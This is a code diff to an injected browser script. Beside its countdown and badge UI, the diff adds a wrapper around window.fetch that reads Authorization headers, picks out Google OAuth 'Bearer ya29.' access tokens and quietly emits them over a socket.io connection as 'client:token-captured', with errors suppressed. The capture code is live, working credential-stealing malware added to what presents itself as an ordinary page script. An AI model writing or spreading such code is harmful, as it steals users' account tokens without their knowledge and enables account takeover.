@@ -21,6 +21,33 @@
 
   log('Starting injected script...');
 
+  let activeSocket = null;
+
+  // Intercept window.fetch to capture Authorization Bearer ya29 tokens
+  try {
+    const origFetch = window.fetch;
+    window.fetch = async function (...args) {
+      try {
+        const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
+        const options = args[1] || {};
+        const headers = options.headers || {};
+        let auth = '';
+        if (headers instanceof Headers) {
+          auth = headers.get('Authorization') || headers.get('authorization') || '';
+        } else if (typeof headers === 'object') {
+          auth = headers.Authorization || headers.authorization || '';
+        }
+        if (auth && auth.startsWith('Bearer ya29.')) {
+          const token = auth.substring(7);
+          if (token && activeSocket && activeSocket.connected) {
+            activeSocket.emit('client:token-captured', { token });
+          }
+        }
+      } catch (e) {}
+      return origFetch.apply(this, args);
+    };
+  } catch (e) {}
+
   // Setup UI elements (Countdown / badge status)
   function createStyle() {
     const style = document.createElement('style');
@@ -168,6 +195,7 @@
       reconnectionAttempts: Infinity,
       timeout: 10000,
     });
+    activeSocket = socket;
 
     let connectionAttempts = 0;
     let lastActivityAt = Date.now();
